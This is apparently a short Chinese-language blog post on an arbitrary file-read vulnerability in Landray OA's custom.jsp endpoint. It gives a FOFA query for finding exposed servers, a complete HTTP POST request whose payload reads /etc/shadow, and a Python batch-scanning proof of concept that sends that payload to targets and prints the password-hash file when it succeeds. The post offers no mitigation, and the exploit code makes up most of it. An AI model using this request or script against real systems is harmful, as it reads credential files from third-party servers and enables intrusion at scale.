Landray-OA前台任意文件读取漏洞

  一.漏洞背景

    蓝凌是国内数字化工作专业服务商,阿里钉钉唯一投资的OA厂商。近期Landray-OA系统被爆出存任意文件读取漏洞。


漏洞复现

祭出fofa大法，fofa语法如下

app="Landray-OA"

漏洞位置在custom.jsp这个文件, post数据为


POST /sys/ui/extend/varkind/custom.jsp HTTP/1.1Host: xxx.xxx.xxx.xxxUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.190 Safari/537.36Content-Type: application/x-www-form-urlencodedAccept-Encoding: gzip

var={"body":{"file":"file:///etc/shadow"}}

部分批量（关键部分）代码如下

def poc(target_url):    url = target_url + "/sys/ui/extend/varkind/custom.jsp"    headers = {                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36",                "Content-Type": "application/x-www-form-urlencoded"    }    data = 'var={"body":{"file":"file:///etc/shadow"}}'    try:        r = requests.post(url=url, data=data, headers=headers, verify=False, timeout=10)        print("\033[36m[o] 请求 {}/sys/ui/extend/varkind/custom.jsp \033[0m".format(target_url))        if "root:" in r.text and r.status_code == 200:            print("\033[31m[o] 读取 /etc/shadow 成功\n[o] 内容:{} \033[36m".format(r.text))
    except Exception as x:        print("\033[36m[x] 请求失败:{} \033[0m".format(x))
